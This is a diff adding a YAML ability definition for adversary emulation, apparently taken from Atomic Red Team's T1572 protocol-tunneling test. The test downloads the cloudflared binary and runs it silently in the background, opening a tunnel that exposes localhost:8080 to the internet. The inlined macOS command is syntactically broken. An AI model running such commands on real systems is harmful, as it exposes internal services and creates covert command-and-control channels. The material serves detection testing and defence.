@@ -1,0 +1,77 @@
+- id: 228c336a-2f79-4043-8aef-bfa453a611d5
+  name: Cloudflare tunnels (Linux/macOS)
+  description: 'Cloudflared can be used for exposing local development environment/services/files
+    over the internet.
+
+    This atomic will generate a dev tunnel binding it to the local service running
+    on the provided port.
+
+    Reference:
+
+    - [Cloudflared Docs](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/)
+
+    - [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/cloudflared/)'
+  tactic: command-and-control
+  technique:
+    attack_id: T1572
+    name: Protocol Tunneling
+  platforms:
+    darwin:
+      sh:
+        command: 'test -f "cloudflared" && exit 0 || exit 1; then : ; else ARCH_SUFFIX=$(uname
+          -m | grep -q "arm64\|aarch64" && echo "arm64" || echo "amd64"); if [ "$(uname)"
+          = "Darwin" ]; then curl -L "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-${ARCH_SUFFIX}.tgz"
+          -o "$(dirname cloudflared)/cloudflared-darwin-${ARCH_SUFFIX}.tgz"; cd "$(dirname
+          cloudflared)"; tar -xzf "cloudflared-darwin-${ARCH_SUFFIX}.tgz"; rm -f "cloudflared-darwin-${ARCH_SUFFIX}.tgz";
+          chmod +x "cloudflared"; elif [ "$(expr substr $(uname) 1 5)" = "Linux" ];
+          then mkdir -p $(dirname cloudflared); curl -L "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${ARCH_SUFFIX}"
+          -o "cloudflared"; chmod +x "cloudflared"; fi; fi; nohup cloudflared tunnel
+          --url localhost:8080 #{additional_args} >/dev/null 2>&1 &'
+        cleanup: pkill -9 $(basename "#{binary_path}"); rm -f "#{binary_path}"
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1572
+  - atomic-red-team
+  - command-and-control
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      cloudflared_artifact_base_url:
+        description: Base URL to download cloudflared
+        type: string
+        default: https://github.com/cloudflare/cloudflared/releases/latest/download
+      binary_path:
+        description: path to download cloudflared
+        type: string
+        default: PathToAtomicsFolder/../ExternalPayloads/cloudflared
+      url_to_tunnel:
+        description: IP and port to expose
+        type: string
+        default: localhost:8080
+      additional_args:
+        description: Additional arguments to pass to cloudflared
+        type: string
+        default: ''
+    dependencies:
+    - description: 'Download cloudflared
+
+        '
+      prereq_command: 'test -f "#{binary_path}" && exit 0 || exit 1
+
+        '
+      get_prereq_command: "ARCH_SUFFIX=$(uname -m | grep -q \"arm64\\|aarch64\" &&\
+        \ echo \"arm64\" || echo \"amd64\")\nif [ \"$(uname)\" = \"Darwin\" ]\nthen\
+        \ curl -L \"#{cloudflared_artifact_base_url}/cloudflared-darwin-${ARCH_SUFFIX}.tgz\"\
+        \ -o \"$(dirname #{binary_path})/cloudflared-darwin-${ARCH_SUFFIX}.tgz\" \n\
+        \  cd \"$(dirname #{binary_path})\"\n  tar -xzf \"cloudflared-darwin-${ARCH_SUFFIX}.tgz\"\
+        \n  rm -f \"cloudflared-darwin-${ARCH_SUFFIX}.tgz\"\n  chmod +x \"#{binary_path}\"\
+        \nelif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]\nthen mkdir -p $(dirname\
+        \ #{binary_path})\n  curl -L \"#{cloudflared_artifact_base_url}/cloudflared-linux-${ARCH_SUFFIX}\"\
+        \ -o \"#{binary_path}\"\n  chmod +x \"#{binary_path}\"\nfi\n"
+    technique_created: '2020-03-15T16:03:39.082Z'
+    atomic_guid: 228c336a-2f79-4043-8aef-bfa453a611d5
+    import_timestamp: '2025-06-24T11:14:07.528567Z'
